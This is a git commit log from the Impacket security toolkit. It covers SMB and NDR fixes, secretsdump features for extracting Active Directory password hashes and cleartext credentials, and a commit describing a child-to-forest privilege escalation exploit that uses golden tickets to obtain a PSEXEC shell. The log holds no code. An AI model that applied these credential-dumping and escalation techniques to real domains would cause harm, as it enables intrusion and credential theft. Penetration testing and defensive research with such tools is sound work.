    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 3e5f763e55ed884e841aeeea93fbe277269e7123
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:49:35 2015 -0300

    SMBConnection.readFile() now tried to read the amount specified by bytesToRead parameter
    
    * Before, if `bytesToRead` was greater than the protocol's `MaxReadSize` buffer
    (dependant on the server's configuration), it would only read that amount of bytes.
    Now it will call `read_andx`() many times until it reached EOF or read all the bytes asked.
    * See https://github.com/CoreSecurity/impacket/issues/94

commit 1677bcfc7cdc1af264a2a970a9878063e95b8934
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:49:35 2015 -0300

    SMBConnection.readFile() now tried to read the amount specified by bytesToRead parameter
    
    * Before, if `bytesToRead` was greater than the protocol's `MaxReadSize` buffer
    (dependant on the server's configuration), it would only read that amount of bytes.
    Now it will call `read_andx`() many times until it reached EOF or read all the bytes asked.

commit 97cb9791326304d7ec6bd1d4c47a7df11950af75
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 18:35:40 2015 -0300

    Adding getIOCapabilities() method, used by SMBConnection object

commit ecb7981993066968d61907e5f723f449f378796e
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 12:27:45 2015 -0300

    No need to specify anything when calling getNTLMSSPType1
    
    * Less prone to encoding errors.

commit c960a8d031280cf07305bd3e28b1df7aec43e94f
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 3 12:07:53 2015 -0300

    Encoding domain field using utf-16le, as specified in the flags field.
    
    * Fixes https://github.com/CoreSecurity/impacket/issues/107

commit 4da024267f99b20f853d771697c57580195b91e0
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 2 13:45:06 2015 -0300

    Fix for https://github.com/CoreSecurity/impacket/issues/106

commit 35ff60efb14d1259a250d766d7663a90e0419a54
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 2 10:08:30 2015 -0300

    Extra checks when stripping leading '/'
    
    * Well.. let's verify there's a '/' there ;)

commit ad215d32df3ad21ebfa6086f20c236ecd17f3842
Merge: b6716a0a a45ff242
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 29 10:45:39 2015 -0300

    Merge branch 'scriptjunkie-ntlmv1fallback'
    
    Merging @scriptjunkie PR adding fallback parameter to SMB object. (See https://github.com/CoreSecurity/impacket/issues/102)
    
    thanks!

commit a45ff2426c39b9a90364bde02e40f2e36f369f21
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 29 09:46:23 2015 -0300

    Adding ntlmFallback parameter to SMBConnection.login()
    
    * If True it will try NTLMv1 authentication if NTLMv2 fails. Only available for SMBv1.
    * Defaults to True

commit 248aae3234d296605427000bd4d1beebd35f5022
Author: scriptjunkie <scriptjunkie@scriptjunkie.us>
Date:   Wed Oct 28 21:46:24 2015 -0500

    ntlmv2 enforcement option on SMB

commit b6716a0a164c1636fb578e6232320e903e1ab55d
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 25 19:19:13 2015 -0300

    Cosmetic changes

commit 5842d99d7432df94f5adb006e09ab93485591d5e
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 22 15:17:53 2015 -0300

    Whenever -resumefile is specified, that filename is also used to keep updating the session state after resuming.
    
    * Why? If for some reason the connection is closed again (or you Ctr-C the script) the session
    state will be saved in the same file provided. So, in order to resume the session just execute
    the script again with the same parameters. Should be easier.

commit bc25c967d9f062a1445cfaa529286c1e32b187c7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 21 15:16:16 2015 -0300

    Fixing raise misuse

commit f4be4a6844d04cd3d5a30e851469f5f0a639c881
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 21 08:53:05 2015 -0300

    Raising exception instead of returning None

commit 72b4ca5fdf873d44298d08a0c279f62e56d61047
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 20 12:40:09 2015 -0300

    Removing +x perm

commit 1a525ebb86b09929f37dab85c9bd58fcf8e49e5e
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 20 11:16:50 2015 -0300

    Logging and exporting (optionally) captured NTLM/NTLMv2 encrypted hashes
    
    * Use -outputfile switch
    * Format is John the Ripper compatible
    * It will only log encrypted hashes after a successful authentication and before the actual attack (-e switch or default behaviour of dumping hashes).
    * Developed in the context of https://github.com/CoreSecurity/impacket/issues/100

commit d2abded84ae59594aaabf56311b91c36cd05ad42
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 16:34:15 2015 -0300

    Asks whether or not to keep the resume session file if you hit Ctrl-C during DRSUAPI

commit 004c350f2e704e92646bbc4e9b162cf42d42fce2
Merge: 5da9fae9 03500067
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 14:13:15 2015 -0300

    Merging @s0crat PR #98 adding NTDS.DIT multiple PEK support (https://github.com/CoreSecurity/impacket/pull/98)
    
    Thanks Pierre!
    
    Merge branch 's0crat-master'

commit 03500067d36eac515282ea26748596b2f2b05018
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 14:12:05 2015 -0300

    Minor cosmetic changes.
    
    * Just to align existing coding convention

commit 39a0919143d4fc1452e47bfcffdec88acba2bd4b
Merge: 5da9fae9 40d2e914
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 13 12:52:07 2015 -0300

    Merge branch 'master' of https://github.com/s0crat/impacket into s0crat-master

commit 40d2e914bdf53a9914f8bd6ae49b57899550ad50
Author: unknown <ptaiani041812@FR09285928D.dsk.eur.msd.world.socgen>
Date:   Tue Oct 13 16:51:01 2015 +0200

    Add support for multiple password encryption keys (PEK)

commit 5da9fae9c0cf77a55e57b805ac79a33e206a1067
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 9 17:46:35 2015 -0300

    Adding queryInfo()
    
    * Queries basic info about an opened file descriptor

commit 8fb3768940e01e74c57274c1748375507905e3be
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 9 17:09:44 2015 -0300

    If UNC is specified in connectTree, we do nothing for SMB1 connections

commit 098296b4ef67fd9281a04f04a7ca7bee0adb8e4c
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 9 16:57:04 2015 -0300

    query_file_info() returns a buffer based on the fileInfoClass parameter
    
    * This is to match smb3.queryInfo()

commit b9b85004e17819fdf302e1177a46c791f09c5c81
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 5 15:32:00 2015 -0300

    Minor fixes for resume capability when using -use-vss flag

commit 18a3c42927dadeec90fc83dc55cfa8614b961fdb
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 5 15:18:19 2015 -0300

    NTDS.DIT resuming capability also works with output files
    
    * If you specified -o xxxx and you suspend the script, everything will be saved.
    * If executed against with -resumefile, the output files will be appended with the new data
    * At the end, you should have the complete set of data in the output files regardless of
      how many times you resumed the script. (assuming you're using the same parameters).
    * This commit is in the context of #85

commit bbff44d1fc555e2de2ffeef1e9f7bb89afd2946b
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 5 09:18:16 2015 -0300

    Keep trying all the secret extraction approaches even if some of them fail.
    
    * You might be able to get hashes w/DRSUAPI and not being able to read SAM (e.g. using a DC machine account)

commit 10a5c954eea1f9c419ca5104f5619386fff7034c
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 2 20:29:30 2015 -0300

    Adding Primary:CLEARTEXT Property from supplementalCredentials attribute
    
    * [MS-SAMR] 3.1.1.8.11.5
    * Available both for DRSUAPI / VSS
    * When using -o a '<outputname>.ntds.cleartext' file is created

commit ae5b1dce67a3d3171b198b769fd89dc7b33892af
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 1 18:27:39 2015 -0300

    Adding resuming capability for NTDS.DIT dump (first try)
    
    * When dumping AD user's hashes/keys (DRSUAPI only) a session file will be created in the current directory
      having the latest SID successfuly processed. Filename is called `sessionresume_XXXXXXXX` (8 random chars)
    * If secretsdump finished succesfully, that file is automatically deleted
    * If the script is killed, or stopped (e.g. hitting Ctrl-C) that file will NOT be removed
    * You can resume the session by running secretsdump with the same parameters and adding the
    -resumefile <filename>parameter
    * You cannot disable secretsdump saving its state to a temporary file (would we want it?)
    * If you specify a resumefile for a different target, you're insane ;). I'm not checking that.
    * This commit is in the context of https://github.com/CoreSecurity/impacket/issues/85

commit c26f17fa00320cbd2ed7ea9fcefb3f0142aac8f4
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 28 12:24:02 2015 -0300

    Enabling dumping hashes/keys for WORKSTATION/SERVER/TRUST accounts by default
    
    * This was disabled in the past since I've got some decoding error reports. After
    all work in the NDR runtime I haven't seen any error again.
    * Please report an issue if some error pops up.

commit 02b083730bc207deacc939347b9495c297f7d14a
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 24 10:42:32 2015 -0300

    Adding debug message when connecting to the KDC

commit 9d4ea5f312229cc7bcb07ed4e674015a9fb261f7
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 23 11:01:33 2015 -0300

    Forgot to disconnect the portmap connection.
    
    * Should fix https://github.com/CoreSecurity/impacket/issues/93

commit 48a97f723a786fd3f0c65f921e9a6d40960e263b
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 23 11:00:30 2015 -0300

    Catching and showing error if lcd fails

commit 1a1e770bf89fac382195f308cdfb2a4daf76abf2
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 23 10:58:57 2015 -0300

    Adding cp437 encoding/decoding
    
    * Still not a final solution for will work much better on some foreign OSes

commit 2af5448b9b556e2071d01c507c2e0bdfe2e47883
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 22 21:43:45 2015 -0300

    Adjust referent data offset by 4
    
    * Since we're advancing 4 bytes first

commit fcbe4fd914250adf89d1d1bad178ae67e1de6a3e
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 18:01:28 2015 -0300

    Removing some debug info

commit e48e2d6c144c073706f9af12f569c0ac30dbf1b7
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 17:53:51 2015 -0300

    Explicitly changing the stdout encoding format if the script's output is redirected

commit 5ab22cf8c06b421f2518c571bad948170e2437c8
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 17:13:32 2015 -0300

    Trying give it a second try if there is a decoding issue happening
    
    * Especially important when dealing with international characters

commit c64a9c565f12668c523cf49e68195ea7445e0b3c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 16:23:25 2015 -0300

    Using sys.getfilesystemencoding() instead of sys.encoding.stdin

commit b3b0407acb8bd1bf5b2584b782d2d5013a5cfcf6
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 16:09:34 2015 -0300

    Using sys.getfilesystemencoding() instead of sys.encoding.stdin
    
    * Works much better on Windows

commit fafbff2034c9930aaf1f9ea77521f6ccee3ae899
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 15:22:57 2015 -0300

    If the script's output is redirected

commit 1afb844b4b2460ecaf12c20bc99b36e8e6c82e98
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 14:12:33 2015 -0300

    Explicitly changing the stdout encoding format

commit 93b61a6c168daec0ca6dc6e761021ba5b3391612
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 14:06:38 2015 -0300

    Better way to detect no pwdLastSet was set

commit 594105211699835120b45bdcdc0335de96d02975
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 18 14:00:45 2015 -0300

    All files written are in utf-8 format.
    
    * Might have some consequences on Windows tho.

commit 879a2cf30bcf37632ad21eae76383dc935f88c83
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 17 18:32:52 2015 -0300

    Trying give it a second try if there is a decoding issue happening
    
    * Especially important when dealing with international characters

commit a893be5850b0abab92c9cb1493cc370550034dac
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 17 11:21:28 2015 -0300

    Adding optional -pwd-last-set switch for NTDS.DIT accounts output
    
    * Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data
    * Added a display options group as part of the scripts options (this will likely grow)
    * Some code simplicity change to cope with so many switches

commit 0524363e88f11355b974ebb66a7002bb7b8b3653
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 16 13:38:38 2015 -0300

    Applying same modifications as https://github.com/CoreSecurity/impacket/commit/1f3cbff8df56344ba4d5552b0ddb8f3cb095194d to goldenPac and raiseChild

commit 1f3cbff8df56344ba4d5552b0ddb8f3cb095194d
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 16 08:55:01 2015 -0300

    Fixed error when targeting a 2012R2 DC with AD Recycle Bin enabled
    
    * DRSGetNCChanges() was returning ERROR_REVISION_MISMATCH
    * Problem was in the dwFlagsExt and dwExtCaps of the DRSBind() method
    * Thanks @carnal0wnage for reporting and helping debugging this issue.

commit 8f209f0731b0dff06ab5eb725e53aa8f0562ed68
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 15 22:45:23 2015 -0300

    Adding more debug info to help diagnosing issues

commit 488fddd1221fcf454e8bced7c9d034a1a40945fb
Author: Or Dagmi <or@digmi.org>
Date:   Sat Sep 12 15:15:31 2015 +0300

    Adding ERP and Country elements to Beacon

commit d46cb154e8dd2c1028e717a2e77059605a2ecfeb
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 11 14:39:46 2015 -0300

    We have to add some SMB flags just in case the original client did not
    
    * Why? needed for avoiding INVALID_PARAMETER when calling FIND_FIRST2

commit 37ebbbbb7d219edc099ab77b62b7855d24868956
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 11 13:47:57 2015 -0300

    Testing all DCs in domain and adding forest's enterprise admin group inside PAC

commit 501482862c7c8d561b2ee28c309cccd12328e8b1
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 18:41:56 2015 -0300

    Code optimization
    
    * Taking advantage of previous NDR.fromString() work done (https://github.com/CoreSecurity/impacket/commit/da05308c042c737d64311c336382ae99b25da1a5)

commit 5c6df1b20a488ef80c6b40784aa784b96d343529
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 18:32:54 2015 -0300

    Looping over the GetNCChanges until there's not more data
    
    * This test could take a lot of time to complete, be aware

commit 3cfe3912159be7c938a5eccd3da112e6e127391a
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 17:31:39 2015 -0300

    Removing dup setArraySize() call

commit 6e25540f0d9e8a2ba875b5b0a37f677faf1ef25d
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 15:44:06 2015 -0300

    Code cleanup

commit c6d57a5aed6f3e8da119d2083a50d52762806ea1
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 12:44:16 2015 -0300

    Moving calcUnPackSize() into unpack()
    
    * Makes code way easier to read

commit da05308c042c737d64311c336382ae99b25da1a5
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 10 12:18:11 2015 -0300

    NDR fromString() now returning bytes processed
    
    * Instead of returning self. Makes things way easier. No need to have getFromStringSize() and arraySoFar.

commit 59af4903bc1ea3f1346a2fc6ea9177c85a8c68a6
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 8 20:36:07 2015 -0300

    Being consistent with what we put inside the try/except clauses

commit 6cebec00f7cf3f09d4112a8df5f021af7f912784
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 12:10:24 2015 -0300

    Adding TCPTransport test cases

commit 7c08162c4f508113eec10348c48caad5cad663a0
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 12:04:27 2015 -0300

    Adding NDR64 tests

commit 4c8470e20e74591e4478dd1327b720852bb76a1b
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 12:00:00 2015 -0300

    Adding the NDR64 testcases. Working now

commit 9b1a71443267f561ecd581684ab8fcd51f2a23a4
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:28:28 2015 -0300

    Adding more test cases to this file

commit 9e98a6803ada9ff1aff3437c2bb8ae404b3de145
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:22:23 2015 -0300

    Wrong branch

commit 144c1f81f604b9c71f5429661c1ee790a8b28f93
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 31 09:19:23 2015 -0300

    Adding NDR64 tests

commit 39c641478d075021e4b3334672868c0a9daef850
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:52:36 2015 -0300

    NDR Runtime test cases

commit c0c233b17e8a8908cae013e7b9caaf685ee584fc
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:52:15 2015 -0300

    Adding new testcase for GetNCChanges

commit 7ee5bf3138f85a8b2c48c54742579371ab5fb45a
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:48:16 2015 -0300

    debug attribute not used anymore

commit 8a265c0c4885c8b5cd2d5b4f8465646e5ebbb68c
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:47:40 2015 -0300

    Removing some debug messages

commit 15d75ec8a315b0c2570b72a594fdb109fba50bc5
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 30 23:33:31 2015 -0300

    getArraySize() also used in NDRSTRUCT.fromString()

commit 8d53ff2b6aba4b829a0fabe34e73039145ca1c1e
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 19:44:24 2015 -0300

    Not counting arraySize when dealing with NDRUniConformantVaryingArray.
    
    * MaximumCount could be larger than ActualCount

commit ce404d4a791aec3e744fed9732f98a3a472af3df
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 17:44:11 2015 -0300

    With the new NDR runtime we don't need this workaround fix

commit 6dd24d89592e2691097540bf0aca05497332bcf3
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 17:33:39 2015 -0300

    Adding UNKNOWNDATA data type

commit fc2bdb8f3ba7f2d882cb9ea784d636f6715eeaa0
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 17:10:57 2015 -0300

    Enclosing more statements inside try clause

commit b14a7e35af95006d294f29400857a38e18df1c5b
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 16:59:52 2015 -0300

    Missed alignment before the size data

commit 95844c75b3a8aea1ad9a28c048a091b2c80195b3
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 16:22:32 2015 -0300

    Adding getArrayMaximumSize() as a way to manage those situations where MaximumCount != ActualCount

commit 2824cd79fff937c06d6306affb3dd6ee1fc9e188
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 14:24:04 2015 -0300

    Replacing code that is already in NDRCONSTRUCTEDTYPE.getArraySize()

commit abf6511655e5aa0562ab1f84621abb0a85ad355c
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 28 13:31:31 2015 -0300

    NDRUniConformantArray and NDRUniConformantVaryingArray don't unpack arraySize anymore
    
    * This will need to be done manually and later on update using setArraySize/getArraySize
    * Why? It is more straighforward since the arraySize in structures is always at the begining of
    the structure rather than before the array stream. We had to make some calculations that are prone
    to fail.
    Still not all test cases working tho.

commit 2362e6ae03aae5b3224960bece598d4810e0b73d
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 15:36:54 2015 -0300

    Leaving a single getData/fromString for most of the arrays

commit 8a8fa1691c79c3c6902b81a6a39de73f8de55da1
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 13:28:38 2015 -0300

    Added restrictions for packing/unpacking referent data from arrays

commit 74ced655f40729f9232f1715d4fb43d907e5f142
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 10:31:51 2015 -0300

    Aligning NDRUNION structure when packing/unpacking

commit de0807b5c0d942f86076a2d32d5a46e8fb98be3c
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 09:35:12 2015 -0300

    Adding getAlignment to SCMR handle structure

commit 51c7f2ab07f211fe149259a875645946e8b84454
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 08:57:15 2015 -0300

    Properly prepare the data buffer when dealing with a pointer to an array

commit 423645e04797e0e6a58c07029809b74f4d77f6fc
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 23:16:15 2015 -0300

    Checking arraySoFar inside NDRUniConformantVaryingArray.fromString()

commit 5acd135958aca30157394c7862f0b2656e232a18
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 22:00:59 2015 -0300

    Removing debug message

commit c303ab3ed85708eb1652576f20df0a0c4fca6589
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 21:42:00 2015 -0300

    Adding the now required getAlignment to string structures

commit 71fdd7e7eb313c00321b81b3d05c580c768223ad
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 19:15:45 2015 -0300

    Adding alignment for SAMR_HANDLE

commit 09c325bebd0b71b3bd0d80ea876497b83572b6f8
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 19:09:36 2015 -0300

    Code cleanup + NDRPOINTER strict alignment
    
    * There's some code I won't use for now. If I need it again, I'll rewrite

commit b57e4b515e3fcd1c84ac029aca0a6376d8f8c490
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:44:05 2015 -0300

    Code Cleanup

commit e3a6d266a650ceb7ba4ed89bdaaea32f67171027
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:30:45 2015 -0300

    Code cleanup
    
    * Removing fromStringOld and calculatePadOld
    * Moving calcPackSize and calcUnpackSize array stuff into NDRCONSTRUCTEDTYPE. Not ideal yet but much better
    than having it inside NDR

commit a50f7ff2f1028b1094dc74069f2df4c5da3342ef
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:17:22 2015 -0300

    Code cleanup
    
    * Moving isUnion()/isPointer() to NDRCONSTRUCTEDTYPES
    * Removing array packing from NDR.pack(), was already in NDRArray.pack()

commit e63345bc0cac03a1d70bfe8a4e9b480bd3cb00ee
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 16:12:47 2015 -0300

    Adding a NDRCONSTRUCTEDTYPE class
    
    * Helpful to better organize methods
    * NDR class is only meant for NDR primitive date types
    * Changes some interfaces data types from NDR->NDRSTRUCT

commit 72264b8b8a0c4016f1d12e620366756911288a1d
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 15:56:26 2015 -0300

    Moving NDRCALL down in the file

commit 8c4601c2708c4355eaf6074f0afcadb6f4a27e44
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 15:23:33 2015 -0300

    More padding adjustements
    
    * NDR trailing GAP padding disabling for now

commit 756043352acfd2d0b7dce9b5aa54179f918f489f
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 13:23:13 2015 -0300

    Forgot changing also the data available

commit f44a9eafaa165d8462073110ba192a4c704db3e9
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 13:16:31 2015 -0300

    Checking NULL Pointer correctly for NDR64

commit a1dfdbbf4b6edecd7cb5cc0b7fecead301f1a4a8
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 25 12:22:26 2015 -0300

    More code cleanup
    
    * Removed CONSISTENCYCHECK code
    * calculatePad redefined
    * NDR is our Primitive Data class
    * array pack/unpack moved to NDRArry.pack() NDRArray.unpack()
    * Alignment is being done only in the places needed
    * getDataArray renamed to getData
    * fromStringArray renamed to fromString
    * NDRPOINTER needs to align itself before moving on

commit 26e9d08e455e622bf0a25670d24ca4cfc70d19b7
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 24 18:42:44 2015 -0300

    Removing unused variables and code cleanup
    
    * self.data, self.rawData
    * switching to @staticmethod for isNDR, isPointer and isUnion
    * Removing some debug messages and changed expections

commit 5a81fa918322b1fb0a84b2fe11cff06ff77501bf
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 8 17:58:38 2015 -0300

    Updated doc

commit de53731514e6d78dbdae4f2c35eac1e08950ceb0
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:24:41 2015 -0300

    Fixed typo

commit 8f2499e94a73be7148abf3f8d153c593bb4d9244
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:22:55 2015 -0300

    Disabling some test cases that are dangerous against a DC.
    
    Use them at your own risk.

commit 46c2dffbda9d83af9bc11f8d982bee5728bdfebd
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 14:30:40 2015 -0300

    NDR64 for drsuapi still not working

commit 9494c2693f7c5e3f5029791c4d8fc4c80222ebbe
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 14:27:01 2015 -0300

    Adding extra debug information

commit be5ad45851ced0859bbf6fa29bf69afa3bc0db73
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 14:05:43 2015 -0300

    Checking DRSCrackNames's rItems status answer as well to verify everything is ok
    
    * Thanks @gentilkiwi for pointing this out

commit f8959be0354857e1658e34e183be05b04c4e49eb
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 3 20:37:19 2015 -0300

    Reliability fixes
    
    1) Using getDNSMachineName() instead of getMachineName() so we have higher chances to resolve the target machines
    2) If the ticket we're making golden doesn't have an ExtraSid already, we need to state ExtraSids are being present in validationInfo['Data']['UserFlags'].
    3) 'Administrator' is not always the name for S-1-5-21-domain-500. Shame on me and all non-us folks
    Thanks @gentilkiwi for your feedback!

commit 3062d8d44e07bec08ede11022815f961e1a46347
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 3 18:55:37 2015 -0300

    Child domain to forest privilege escalation exploit
    
    This script implements a child-domain to forest privilege escalation
    as detailed by Sean Metcalf at https://adsecurity.org/?p=1640. We will
    be (ab)using the concept of Golden Tickets and ExtraSids researched and implemented
    by Benjamin Delpy (@gentilkiwi) in mimikatz (https://github.com/gentilkiwi/mimikatz).
    The idea of automating all these tasks came from @mubix.
    
    The workflow is as follows:
        Input:
            1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'i
               The domain specified MUST be the domain FQDN.
            2) Optionally a pathname to save the generated golden ticket (-w switch)
            3) Optionally a target to PSEXEC with Enterprise Admin privieleges to (-target-exec switch)
    
        Process:
            1) Find out where the child domain controller is located and get its info (via MS_NRPC)
            2) Find out what the forest FQDN is (via MS_NRPC)
            3) Get the forest's Enterprise Admin SID (via XXX)
            4) Get the child domain's krbtgt credentials (via MS_DRSR)
            5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
               and setting expiration 10 years from now
            6) Use the generated ticket to log into the forest and get the krbtgt/admin info
            7) If file was specified, save the golden ticket in ccache format
            8) If target was specified, a PSEXEC shell is launched
    
        Output:
            1) Forest's krbtgt/admin credentials
            2) A golden ticket saved in ccache for future fun and profit
            3) PSExec Shell with Enterprise Admin privileges at target-exec parameter.
    
    IMPORTANT NOTE: Your machine MUST be able to resolve all the domains from the child domain up to the
                    forest.

commit 81b92d4f3ce6308e45b5e40ab765575660a85cca
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 2 17:01:21 2015 -0300

    Adding some Kerberos crypto constants

commit fd455a6baf1378e50434a1e1a755e981bd0b6f5e
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 31 17:14:38 2015 -0300

    Keep asking TGS until we get the one we want.
    
    * This should only happen when jumping from one domain to another.

commit d7a7950d972cf9721c03796094af7b015e3fc77d
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 27 13:35:15 2015 -0300

    Adding -just-dc and -just-dc-ntlm options
    
    * -just-dc -> Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
    * -just-dc-ntlm -> Extract only NTDS.DIT data (NTLM hashes only)
    * Fixes https://github.com/CoreSecurity/impacket/issues/84
    * Also fixed a silly logic check that was preventing to parse NTDS.DIT files after we added DRSUAPI

commit 745e6d5f681c5060ba5b8c0cdc0d1b1cc4dc8ab2
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 27 10:47:09 2015 -0300

    DRSGetNCChanges only asks for the AD attributes we're interested in.
    
    * The attributes asked are:
     userPrincipalName(1.2.840.113556.1.4.656)
     sAMAccountName(1.2.840.113556.1.4.221)
     unicodePwd(1.2.840.113556.1.4.90)
     dBCSPwd(1.2.840.113556.1.4.55)
     ntPwdHistory(1.2.840.113556.1.4.94)
     lmPwdHistory(1.2.840.113556.1.4.160)
     supplementalCredentials(1.2.840.113556.1.4.125)
     objectSid(1.2.840.113556.1.4.146)
    * Lowers traffic generated
    * Helps minimizing parsing issues
    * Supposed to fix https://github.com/CoreSecurity/impacket/issues/83. Retest needed

commit e6ec7297eb4b4799a6e048222a7e27dc03a2d1fa
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 24 13:37:24 2015 -0300

    Added support for Windows 2003 DC
    
    * Turns out EXOP_REPL_SECRETS and in fact not supported in w2k3:
    <24> Section 4.1.10.1.3: The Replicate Single Object including Secret Data extended operation is supported by Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2.
    * Forgot to add DRS_WRIT_REP to the ulFlags.
    These two changes made the trick!
    * Tested against Win2k3/Win2k8r2/Win2k12R2
    
    Big thanks to @gentilkiwi for pointing out this wasn't working and help finding possible solutions (e.g. the ulFlags issue).

commit 7b78da36b986f0ff33f1f0c9a212870196144cfa
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 23 17:39:36 2015 -0300

    Cracking users using their SIDs instead of their name.
    
    Why? There could be problems when dealing with a forest with multiple subdomains in there
    and referencing the accounts by names.
    Thanks @gentilkiwi for pointing this out!
    I haven't been able to test it but this should solve the problem.

commit 8865ea30f247547d30465a5958225ac71074f085
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 11:34:13 2015 -0300

    Not processing machines' accounts for now.

commit 5aeb8ed5bf624c83327445e9265371d0aa111861
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 17 20:29:02 2015 -0300

    Restrict the amount of data to dump when an unpacking expection is printed.
    
    * Handy when we're unpacking a huge buffer. (i.e. DRSGetNCChanges())

commit e514994de1a841358c8ff707e1600e3f9fd7ad63
Author: asolino <bethus@gmail.com>
Date:   Sat Aug 15 18:30:33 2015 -0300

